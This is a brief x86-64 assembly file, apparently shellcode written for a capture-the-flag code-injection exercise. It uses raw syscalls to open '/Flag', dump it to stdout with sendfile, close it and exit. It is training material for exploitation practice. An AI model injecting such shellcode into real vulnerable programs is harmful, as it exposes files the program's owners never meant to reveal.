#open a file called Flag in the root dir using a code injection in myFirstInjection (parent dir)
#tentative n°2

.intel_syntax 	noprefix
.global		_start
.section .text
_start:
	call openFile
	call sendFile
	call close
	call exit
openFile:
	mov	rax, 2
	lea	rdi, [rip+file]
	mov	rsi, 0
	mov	rdx, 0
	syscall
	mov	r8, rax
	ret
sendFile:
	mov	rax, 40
	mov	rdi, 1
	mov	rsi, r8
	mov	rdx, 0
	mov	r10, 64
	syscall
	ret
close:
	mov	rax, 3
	mov	rdi, r8
	syscall
	ret
exit:
	mov	rax, 60
	xor	rdi, rdi
	syscall

file: 	.string "/Flag"
